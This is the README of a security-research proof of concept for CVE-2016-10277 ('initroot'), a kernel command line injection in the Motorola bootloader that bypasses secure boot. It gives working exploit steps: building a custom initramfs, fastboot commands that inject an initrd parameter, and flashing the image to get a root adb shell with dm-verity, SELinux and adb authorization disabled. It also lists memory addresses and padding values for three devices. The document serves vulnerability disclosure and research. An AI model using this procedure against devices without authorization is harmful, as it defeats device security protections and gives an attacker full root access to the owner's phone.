# PoC for initroot: Motorola Bootloader Kernel Command Line Injection Secure Boot Bypass (CVE-2016-10277) #

By Roee Hay / Aleph Research, HCL Technologies

## Instructions ##

1. Use the commited `initroot-<device>.cpio.gz`, or produce your own:
```
$ cd <initramfs folder>
$ find . | grep -v [.]$ | cpio -R root:root -o -H newc | gzip > ../initroot-<device>.cpio.gz
$ cd ..
```
2. Our commited initramfs images have adb running as root by default. It will not ask for authorization. In addition, dm-verity is disabled on the relevant partitions
```terminal
fastboot oem config fsg-id "a initrd=<SCATCH_ADDR+PADDING>,<initroot.cpio.gz size-PADDING>"`
fastboot flash foo initroot-<device>.cpio.gz`
fastboot continue
```
3. if you use our initramfs, `adb shell` will now give you a root shell:
```
$ adb shell
shamu:/ # id
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:su:s0
```

## Verified Devices ##

| Device           | `SCRATCH_ADDR` | `PADDING`   | committed `initrams`
|------------------|--------------|-----------|---------
| shamu (Nexus 6)  | `0x11000000`   | `0x0`         | AOSP `userdebug`
| cedric (Moto G5) | `0xA0100000`   | `0x2000000` | Release, patched `init` and `adbd` to disable SELinux, `set{u,g}id` to shell, capabilities drop and adb auth
| athene (Moto G6) | `0x90000000`   | `0x2000000` | ""



**Note**:
This vulnerability may affect other Motorola devices too: a different initramfs will be needed. A different physical address of initrd (`SCRATCH_ADDR`). `PADDING` may vary as well.

Blog post with details is available [here](https://alephsecurity.com/2017/05/23/nexus6-initroot/)



